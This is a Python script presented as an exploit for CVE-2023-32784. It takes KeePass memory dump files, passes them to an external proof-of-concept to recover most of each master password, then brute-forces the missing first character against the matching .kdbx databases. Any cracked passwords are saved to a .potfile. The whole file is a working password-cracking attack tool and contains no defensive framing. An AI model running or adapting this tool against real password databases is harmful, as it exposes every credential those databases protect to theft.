import argparse
import os
import subprocess
from pykeepass import PyKeePass

charset_first_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:',.<>?`~"

def read_dump_file(file_name, dmp_file, keepass_dump_dir="./keepass-dump-masterkey"):
    file_name = f'../{file_name}.txt'
    command = ['python3', 'poc.py', dmp_file]
    try:
        result = subprocess.run(command, cwd=keepass_dump_dir, capture_output=True, text=True, check=True).stdout.splitlines()
        passwords = result
        return passwords
    except subprocess.CalledProcessError as e:
        print(f"Error running poc command: {e}")
        return []

def generate_passwords(start_char, password_parts):
    for password_part in password_parts:
        password = start_char + password_part
        yield password

def try_login(kdbx_file, password):
    try:
        kp = PyKeePass(kdbx_file, password=password)
        print(f"Successfully login with password: {password}")
        print()
        return True
    except:
        print(f"{password}")
        return False

def main(dir_path):
    try:
        kdbx_files = [f for f in os.listdir(dir_path) if f.endswith('.kdbx')]
        dmp_files = [f for f in os.listdir(dir_path) if f.endswith('.DMP')]
        
        if len(kdbx_files) == 0 & len(dmp_files) == 0:
            return
        
        print('********************************************************')
        print('DUMP files founded:')
        print(dmp_files)
        print()
        print('KDBX files founded:')
        print(kdbx_files)
        print('********************************************************')
        print()
        
        successfully_passwords = []
        for kdbx_file in kdbx_files:
            corresponding_dmp = kdbx_file.replace('.kdbx', '.DMP')
            if corresponding_dmp in dmp_files:
                dmp_path = f'../dumps/{corresponding_dmp}'
                kdbx_path = os.path.join(dir_path, kdbx_file)

                print('********************************************************')
                print(f'KDBX file: {kdbx_file}')
                print()
                print(f'DUMP file: {corresponding_dmp}')
                print('********************************************************')
                print()
                print('Reading DUMP file ...')
                print()
                
                password_parts = read_dump_file(corresponding_dmp, dmp_path)
                password_found = False
                
                if len(password_parts) > 0:
                    print('********************************************************')
                    print('Reading DUMP file successfully!')
                    print('********************************************************')
                    print()
                else:
                    print(f'Keepass Password Dumper program closed.')
                    print('********************************************************')
                    exit()
                
                
                print('************************** Try passwords ******************************')
                print()
                for password in password_parts:
                    if password_found:
                        break 

                    for start_char in charset_first_char:
                        if password_found:
                            break 

                        password_tail = password[20:]
                        passwords_to_try = generate_passwords(start_char, [password_tail])
                        
                        for pw in passwords_to_try:
                            if try_login(kdbx_path, pw):
                                password_found = True
                                successfully_passwords.append(f"{kdbx_file} : {pw}")
                                break
        if len(successfully_passwords) > 0: 
            print('********************************************************')
            print('Founded passwords:')
            print(successfully_passwords)
            print('********************************************************')
            print()
            potfile = os.path.join(dir_path, '.potfile')
            with open(potfile, 'w', encoding='utf-8') as file:
                for pw_key_pair in successfully_passwords:
                    file.write(f"{pw_key_pair}\n")
            print('Passwords were written to the file .potfile.')
        else:
            print('No correct password pair founded.')
    except FileNotFoundError:
        print('Dictionary not found!')
        return
    except KeyboardInterrupt:
        print('\nYou exit the program manually.')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit CVE-2023-32784 to crack KeePass master passwords.")
    parser.add_argument("-dir", required=True, help="Directory containing .kdbx and .DMP files")
    args = parser.parse_args()

    print('*************************************************************')
    print('KeePass Password Dumping started.')
    print()
    main(args.dir)
    print()
    print('*********************** BYE **********************************')
    exit()
